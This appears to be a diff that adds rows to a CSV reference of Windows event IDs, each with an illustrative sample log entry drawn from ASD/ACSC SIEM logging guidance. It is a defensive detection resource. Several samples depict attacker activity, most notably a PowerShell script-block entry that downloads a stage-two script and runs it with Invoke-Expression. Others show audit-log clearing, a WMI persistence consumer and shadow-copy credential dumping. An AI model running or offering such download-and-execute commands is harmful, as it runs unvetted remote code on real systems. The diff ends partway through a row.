@@ -10492,3 +10492,868 @@ The CTAP test provider thread stopped because of an error.
 	TransactionId:		0x4f2a19c3
 	Error:		0x80070490 (ERROR_NOT_FOUND)
 	Win32Error:		1168 (ERROR_NOT_FOUND)",https://learn.microsoft.com/en-us/windows/win32/api/webauthn/,Enable Microsoft-Windows-WebAuthN/Operational log,illustrative
+4627,Security,Microsoft-Windows-Security-Auditing,Logon/Logoff,Audit Group Membership,Group membership information for a logon was recorded.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4627
+Task Category: Audit Group Membership
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Group membership information.
+
+Subject:
+	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1231
+	Account Name:		j.doe
+	Account Domain:		CORP
+	Logon ID:		0x3E7F21
+
+Group Membership:
+	CORP\Domain Users
+	CORP\Finance-ReadOnly","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4703,Security,Microsoft-Windows-Security-Auditing,Policy Change,Audit Authorization Policy Change,A user right was adjusted.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4703
+Task Category: Audit Authorization Policy Change
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A user right was adjusted.
+
+Subject:
+	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1105
+	Account Name:		admin.jsmith
+	Account Domain:		CORP
+	Logon ID:		0x3E7F21
+
+Target Account:
+	Security ID:		S-1-5-20
+	Account Name:	NETWORK SERVICE
+
+Changes:
+	User Right:		SeDebugPrivilege
+	Assigned To:	CORP\svc-backup","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4820,Security,Microsoft-Windows-Security-Auditing,Account Logon,Audit Kerberos Service Ticket Operations,A Kerberos Ticket-granting-ticket (TGT) was denied because the device does not meet the access control restrictions.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4820
+Task Category: Audit Kerberos Service Ticket Operations
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A Kerberos Ticket-granting-ticket (TGT) was denied because the device does not meet the access control restrictions.
+
+Account Information:
+	Account Name:		j.doe
+	Supplied Realm Name:	CORP.LOCAL
+
+Device Information:
+	Device ID:		S-1-5-21-3623811015-3361044348-30300820-2201
+	Device Name:	WKS-0142
+
+Additional Information:
+	Ticket Options:		0x40810010
+	Result Code:		0x25 (KDC_ERR_POLICY)","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4821,Security,Microsoft-Windows-Security-Auditing,Account Logon,Audit Kerberos Service Ticket Operations,"A Kerberos service ticket was denied because the user, device, or both do not meet the access control restrictions.","Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4821
+Task Category: Audit Kerberos Service Ticket Operations
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A Kerberos service ticket was denied because the user, device, or both do not meet the access control restrictions.
+
+Account Information:
+	Account Name:		j.doe
+
+Service Information:
+	Service Name:		HTTP/app01.corp.local
+
+Additional Information:
+	Ticket Options:		0x40810000
+	Result Code:		0x25 (KDC_ERR_POLICY)","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4822,Security,Microsoft-Windows-Security-Auditing,Account Logon,Audit Credential Validation,NTLM logon authentication failed.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4822
+Task Category: Audit Credential Validation
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+NTLM logon authentication failed.
+
+Account Information:
+	Account Name:		j.doe
+	Account Domain:		CORP
+
+Network Information:
+	Workstation Name:	WKS-0142
+	Source Network Address:	10.20.40.142
+
+Detailed Authentication Information:
+	Authentication Package:	NTLM
+	Failure Reason:	Unknown user name or bad password.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4824,Security,Microsoft-Windows-Security-Auditing,Account Logon,Audit Kerberos Authentication Service,Kerberos pre-authentication using DES or RC4 failed because the account was a member of the Protected Users group.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4824
+Task Category: Audit Kerberos Authentication Service
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Kerberos pre-authentication using DES or RC4 failed because the account was a member of the Protected Users group.
+
+Account Information:
+	Account Name:		admin.jsmith
+	Supplied Realm Name:	CORP.LOCAL
+
+Additional Information:
+	Pre-Authentication Type:	2
+	Encryption Type:	0x17 (RC4-HMAC)
+	Result Code:	0x18","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4899,Security,Microsoft-Windows-Security-Auditing,Object Access,Audit Certification Services,A certificate template was updated.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4899
+Task Category: Audit Certification Services
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A certificate template was updated.
+
+Certificate Services:
+	Server:			CORP-DC01-CA
+	Template:		User
+
+Subject:
+	Account Name:		admin.jsmith","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4900,Security,Microsoft-Windows-Security-Auditing,Object Access,Audit Certification Services,Certificate Services template security was updated.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4900
+Task Category: Audit Certification Services
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Certificate Services template security was updated.
+
+Certificate Services:
+	Server:			CORP-DC01-CA
+	Template:		User
+
+Subject:
+	Account Name:		admin.jsmith","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+5124,Security,Microsoft-Windows-Security-Auditing,Object Access,OCSP Responder Service,A security setting was updated on the OCSP Responder Service.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      5124
+Task Category: OCSP Responder Service
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A security setting was updated on the OCSP Responder Service.
+
+Subject:
+	Account Name:		admin.jsmith
+
+OCSP Responder:
+	Server:		CORP-OCSP01","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+6410,Security,Microsoft-Windows-Security-Auditing,System,Audit System Integrity,Code Integrity determined that a file did not meet the security requirements to load into a process.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      6410
+Task Category: Audit System Integrity
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Code Integrity determined that a file did not meet the security requirements to load into a process.
+
+Process Information:
+	Process ID:		0x1f38
+	Process Name:	C:\Windows\System32\svchost.exe
+
+File Information:
+	File Name:	C:\Temp\unsigned-tool.dll
+	File Hash:	(SHA-256, mismatched)","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+1102,Security,Microsoft-Windows-Security-Auditing,System,Audit System Integrity,The audit log was cleared.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      1102
+Task Category: Audit System Integrity
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The audit log was cleared.
+
+Subject:
+	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1105
+	Account Name:		admin.jsmith
+	Account Domain:		CORP
+	Logon ID:		0x3E7F21
+
+Category ID:		%%8272
+Subcategory ID:		0x0","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+1200,Security,AD FS Auditing,AD FS,Token Issuance,The Federation Service issued a token in response to a request for a security token.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      1200
+Task Category: AD FS Auditing
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The Federation Service issued a token in response to a request for a security token.
+
+Instance ID:		{7c1e2a4d-9f3b-4e2a-8b1c-3d4e5f6a7b8c}
+Relying Party:		https://portal.corp.local
+Requestor:		CORP\j.doe
+Client IP:		10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+1202,Security,AD FS Auditing,AD FS,Credential Validation,The Federation Service validated a new credential.,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      1202
+Task Category: AD FS Auditing
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The Federation Service validated a new credential.
+
+Requestor:		CORP\j.doe
+Credential Type:	Username/Password
+Client IP:		10.20.40.142","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+39,Application,Microsoft-Windows-CertificateServicesClient-Lifecycle-System,Certificate Services,,The Certificate Services service failed.,"Log Name:      Application
+Source:        Microsoft-Windows-CertificateServicesClient-Lifecycle-System
+Event ID:      39
+Level:         Error
+Computer:      DC01.corp.local
+Description:
+The Certificate Services service failed.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+40,Application,Microsoft-Windows-CertificateServicesClient-Lifecycle-System,Certificate Services,,The Certificate Services service did not start.,"Log Name:      Application
+Source:        Microsoft-Windows-CertificateServicesClient-Lifecycle-System
+Event ID:      40
+Level:         Error
+Computer:      DC01.corp.local
+Description:
+The Certificate Services service did not start.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+41,Application,Microsoft-Windows-CertificateServicesClient-Lifecycle-System,Certificate Services,,An incompatible SID was found on a certificate during strong certificate mapping enforcement.,"Log Name:      Application
+Source:        Microsoft-Windows-CertificateServicesClient-Lifecycle-System
+Event ID:      41
+Level:         Error
+Computer:      DC01.corp.local
+Description:
+An incompatible SID was found on a certificate during strong certificate mapping enforcement.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+70,Application,CertSvc,Certificate Services,,A certificate was exported from the certification authority.,"Log Name:      Application
+Source:        CertSvc
+Event ID:      70
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+A certificate was exported from the certification authority CORP-DC01-CA.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+510,AD FS/Admin,AD FS,AD FS,,Additional information supporting AD FS Admin event 307 (configuration change detail).,"Log Name:      AD FS/Admin
+Source:        AD FS
+Event ID:      510
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Additional information supporting AD FS Admin event 307 (configuration change detail).","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+1007,AD FS/Admin,AD FS,AD FS,,The AD FS token-signing or token-decryption certificate was exported.,"Log Name:      AD FS/Admin
+Source:        AD FS
+Event ID:      1007
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+The AD FS token-signing or token-decryption certificate was exported.","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4678,Security,Microsoft-Windows-Security-Auditing,Account Logon,Kerberos,Kerberos logon ticket activity (as categorised by the source guidance; verify exact semantics in your environment).,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4678
+Task Category: Kerberos
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Kerberos logon ticket activity.
+
+Account Information:
+	Account Name:		j.doe
+	Supplied Realm Name:	CORP.LOCAL","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — this event ID's exact semantics could not be independently corroborated; transcribed as documented.",,illustrative
+4679,Security,Microsoft-Windows-Security-Auditing,Account Logon,Kerberos,Kerberos service ticket activity (as categorised by the source guidance; verify exact semantics in your environment).,"Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Event ID:      4679
+Task Category: Kerberos
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Kerberos service ticket activity.
+
+Account Information:
+	Account Name:		j.doe
+	Supplied Realm Name:	CORP.LOCAL","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — this event ID's exact semantics could not be independently corroborated; transcribed as documented.",,illustrative
+2889,Directory Service,Microsoft-Windows-ActiveDirectory_DomainService,DS Access,LDAP Signing,"A client made an LDAP bind without requesting signing (or a simple bind over a non-SSL/TLS connection), which will be rejected once LDAP signing/channel binding enforcement is enabled.","Log Name:      Directory Service
+Source:        Microsoft-Windows-ActiveDirectory_DomainService
+Event ID:      2889
+Task Category: LDAP Interface Events
+Level:         Warning
+Computer:      DC01.corp.local
+Description:
+The following client performed a SASL (Negotiate/Kerberos/NTLM/Digest) LDAP bind without requesting signing (integrity verification), or performed a simple bind over a non-SSL/TLS connection.
+
+Client IP address:	10.20.40.142:52344
+Identity the client attempted to authenticate as:	CORP\legacy-app-svc
+Binding Type:	0","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+3033,Microsoft-Windows-CodeIntegrity/Operational,Microsoft-Windows-CodeIntegrity,System,Code Integrity Policies,Code Integrity determined that a process attempted to load a file that does not meet organizational signing/policy requirements.,"Log Name:      Microsoft-Windows-CodeIntegrity/Operational
+Source:        Microsoft-Windows-CodeIntegrity
+Event ID:      3033
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+Code Integrity determined that a process attempted to load a file that does not meet organizational signing/policy requirements.
+
+File Name:	C:\Temp\unsigned-driver.sys
+SHA256 Hash:	(mismatched)","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — the source document lists this under ""Local Security Authority Subsystem Service"" but maps its Group Policy Object to ""Code Integrity Policies""; channel shown reflects the latter. Verify against your own environment.",,illustrative
+3063,Microsoft-Windows-CodeIntegrity/Operational,Microsoft-Windows-CodeIntegrity,System,Code Integrity Policies,"Code Integrity Policy blocked, or would have blocked, a driver or file from loading.","Log Name:      Microsoft-Windows-CodeIntegrity/Operational
+Source:        Microsoft-Windows-CodeIntegrity
+Event ID:      3063
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+Code Integrity Policy blocked, or would have blocked, a driver or file from loading.
+
+File Name:	C:\Temp\unsigned-driver.sys
+SHA256 Hash:	(mismatched)","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — the source document lists this under ""Local Security Authority Subsystem Service"" but maps its Group Policy Object to ""Code Integrity Policies""; channel shown reflects the latter. Verify against your own environment.",,illustrative
+8222,Application,VSS,Dumping,Shadow copy,"The Volume Shadow Copy Service recorded an event associated with the creation, access, or deletion of a shadow copy — relevant to detecting shadow-copy-based credential dumping (e.g. NTDS.dit extraction).","Log Name:      Application
+Source:        VSS
+Event ID:      8222
+Level:         Information
+Computer:      DC01.corp.local
+Description:
+Volume Shadow Copy Service: A shadow copy was created for volume \\?\Volume{...}\, requested by process ID 4820 (vssadmin.exe / diskshadow.exe).","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — log channel is a best-effort attribution; verify against your own environment.",,illustrative
+1,Microsoft-Windows-Sysmon/Operational,Microsoft-Windows-Sysmon,Windows Application Event Logs,Process Creation,Sysmon logged a process creation event.,"Log Name:      Microsoft-Windows-Sysmon/Operational
+Source:        Microsoft-Windows-Sysmon
+Event ID:      1
+Task Category: Process Create (rule: ProcessCreate)
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+Process Create:
+RuleName: -
+UtcTime: 2026-07-28 09:14:02.123
+ProcessId: 8040
+Image: C:\Windows\System32\cmd.exe
+CommandLine: cmd.exe /c whoami
+User: CORP\j.doe
+ParentImage: C:\Windows\explorer.exe
+Hashes: SHA256=...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+1001,Application,Windows Error Reporting,Windows Application Event Logs,Crashes,A fault bucket was created for an application crash (Windows Error Reporting).,"Log Name:      Application
+Source:        Windows Error Reporting
+Event ID:      1001
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+Fault bucket 123456789, type 0
+Event Name: APPCRASH
+Application Name: contoso-app.exe
+Application Version: 3.2.1.0
+Fault Module Name: ntdll.dll
+Report Id: {a1b2c3d4-...}","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+118,Microsoft-Windows-TaskScheduler/Operational,Microsoft-Windows-TaskScheduler,Windows Task Scheduler Event Logs,,A scheduled task was triggered by computer start-up.,"Log Name:      Microsoft-Windows-TaskScheduler/Operational
+Source:        Microsoft-Windows-TaskScheduler
+Event ID:      118
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+A scheduled task was triggered by computer start-up.
+
+Task Name:	\Microsoft\Windows\CorpApp\NightlySync
+User Context:	CORP\svc-backup","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+119,Microsoft-Windows-TaskScheduler/Operational,Microsoft-Windows-TaskScheduler,Windows Task Scheduler Event Logs,,A scheduled task was triggered by user logon.,"Log Name:      Microsoft-Windows-TaskScheduler/Operational
+Source:        Microsoft-Windows-TaskScheduler
+Event ID:      119
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+A scheduled task was triggered by user logon.
+
+Task Name:	\Microsoft\Windows\CorpApp\NightlySync
+User Context:	CORP\svc-backup","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+129,Microsoft-Windows-TaskScheduler/Operational,Microsoft-Windows-TaskScheduler,Windows Task Scheduler Event Logs,,Task Scheduler launched a process (created a task process).,"Log Name:      Microsoft-Windows-TaskScheduler/Operational
+Source:        Microsoft-Windows-TaskScheduler
+Event ID:      129
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+Task Scheduler launched a process (created a task process).
+
+Task Name:	\Microsoft\Windows\CorpApp\NightlySync
+User Context:	CORP\svc-backup","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+200,Microsoft-Windows-TaskScheduler/Operational,Microsoft-Windows-TaskScheduler,Windows Task Scheduler Event Logs,,An action within a scheduled task started.,"Log Name:      Microsoft-Windows-TaskScheduler/Operational
+Source:        Microsoft-Windows-TaskScheduler
+Event ID:      200
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+An action within a scheduled task started.
+
+Task Name:	\Microsoft\Windows\CorpApp\NightlySync
+User Context:	CORP\svc-backup","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4103,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,Windows PowerShell Event Logs,Module Event,A PowerShell pipeline execution detail (module logging) event was recorded.,"Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4103
+Task Category: Executing Pipeline
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+CommandInvocation(Get-Process): ""Get-Process""
+Context:
+	Severity = Informational
+	HostName = ConsoleHost
+	HostVersion = 5.1.19041.1
+	HostId = {...}
+	User = CORP\j.doe","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+4104,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,Windows PowerShell Event Logs,Script Block Event,PowerShell Script Block Logging recorded the text of an executed script block.,"Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+Creating Scriptblock text (1 of 1):
+Invoke-WebRequest -Uri http://10.20.99.50/stage2.ps1 | Invoke-Expression
+
+ScriptBlock ID: 4f2a19c3-7b3a-4a2e-9c47-2f3f8f6a90c1
+Path: -","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+400,Windows PowerShell,PowerShell,Windows PowerShell Event Logs,Engine Lifecycle,The PowerShell engine state changed to Available (a new PowerShell host/session started).,"Log Name:      Windows PowerShell
+Source:        PowerShell
+Event ID:      400
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+Engine state is changed from None to Available.
+
+Details:
+	NewEngineState=Available
+	PreviousEngineState=None
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1
+	HostApplication=powershell.exe
+	EngineVersion=5.1.19041.1
+	RunspaceId={...}
+	PipelineId=","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+5857,Microsoft-Windows-WMI-Activity/Operational,Microsoft-Windows-WMI-Activity,Windows WMI Activity/Operational Event Logs,,A WMI provider started an operation.,"Log Name:      Microsoft-Windows-WMI-Activity/Operational
+Source:        Microsoft-Windows-WMI-Activity
+Event ID:      5857
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+A WMI provider started an operation.
+
+GroupOperationId: 84213
+OperationId: 84214
+Provider: WBEMPerm
+Consumer: ActiveScriptEventConsumer.Name=""PersistenceConsumer""","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+5858,Microsoft-Windows-WMI-Activity/Operational,Microsoft-Windows-WMI-Activity,Windows WMI Activity/Operational Event Logs,,A WMI provider reported a client failure.,"Log Name:      Microsoft-Windows-WMI-Activity/Operational
+Source:        Microsoft-Windows-WMI-Activity
+Event ID:      5858
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+A WMI provider reported a client failure.
+
+GroupOperationId: 84213
+OperationId: 84214
+Provider: WBEMPerm
+Consumer: ActiveScriptEventConsumer.Name=""PersistenceConsumer""","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+5859,Microsoft-Windows-WMI-Activity/Operational,Microsoft-Windows-WMI-Activity,Windows WMI Activity/Operational Event Logs,,The WMI Event Subsystem (ESS) started.,"Log Name:      Microsoft-Windows-WMI-Activity/Operational
+Source:        Microsoft-Windows-WMI-Activity
+Event ID:      5859
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+The WMI Event Subsystem (ESS) started.
+
+GroupOperationId: 84213
+OperationId: 84214
+Provider: WBEMPerm
+Consumer: ActiveScriptEventConsumer.Name=""PersistenceConsumer""","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+5860,Microsoft-Windows-WMI-Activity/Operational,Microsoft-Windows-WMI-Activity,Windows WMI Activity/Operational Event Logs,,A temporary WMI Event Subsystem (ESS) was started.,"Log Name:      Microsoft-Windows-WMI-Activity/Operational
+Source:        Microsoft-Windows-WMI-Activity
+Event ID:      5860
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+A temporary WMI Event Subsystem (ESS) was started.
+
+GroupOperationId: 84213
+OperationId: 84214
+Provider: WBEMPerm
+Consumer: ActiveScriptEventConsumer.Name=""PersistenceConsumer""","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+5861,Microsoft-Windows-WMI-Activity/Operational,Microsoft-Windows-WMI-Activity,Windows WMI Activity/Operational Event Logs,,A WMI Event Subsystem (ESS) was bound to a consumer (e.g. a permanent WMI event subscription/consumer binding — commonly abused for persistence).,"Log Name:      Microsoft-Windows-WMI-Activity/Operational
+Source:        Microsoft-Windows-WMI-Activity
+Event ID:      5861
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+A WMI Event Subsystem (ESS) was bound to a consumer (e.g. a permanent WMI event subscription/consumer binding — commonly abused for persistence).
+
+GroupOperationId: 84213
+OperationId: 84214
+Provider: WBEMPerm
+Consumer: ActiveScriptEventConsumer.Name=""PersistenceConsumer""","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+7045,System,Service Control Manager,Windows Security Event Logs,Service installed,A new service was installed on the system.,"Log Name:      System
+Source:        Service Control Manager
+Event ID:      7045
+Task Category: None
+Level:         Information
+Computer:      WKS-0142.corp.local
+Description:
+A service was installed in the system.
+
+Service Name:	CorpUpdaterSvc
+Service File Name:	C:\ProgramData\update.exe
+Service Type:	user mode service
+Service Start Type:	auto start
+Service Account:	LocalSystem","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables",,illustrative
+8000,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,AppLocker rule was evaluated but a policy was incorrectly applied.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8000
+Level:         Warning
+Computer:      WKS-0142.corp.local
+Description:
+AppLocker rule was evaluated but a policy was incorrectly applied.
+
+Path:	C:\Users\j.doe\Downloads\tool.exe
+User:	CORP\j.doe
+TargetUser:	CORP\j.doe
+Fqbn:	O:...\P:...","ASD/ACSC ""Priority logs for SIEM ingestion: Practitioner guidance"" (2025), Microsoft Domain Controller / AD & Domain Service Security Logs / Microsoft Windows endpoint logs / Windows DNS server analytic event logs tables — specific AppLocker/WDAC sub-channel (EXE and DLL / MSI and Script / Packaged app / CodeIntegrity) varies by event; verify the exact channel in your environment.",,illustrative
+8001,Microsoft-Windows-AppLocker,Microsoft-Windows-AppLocker,AppLocker,,The AppLocker policy was changed/applied.,"Log Name:      Microsoft-Windows-AppLocker/EXE and DLL
+Source:        Microsoft-Windows-AppLocker
+Event ID:      8001
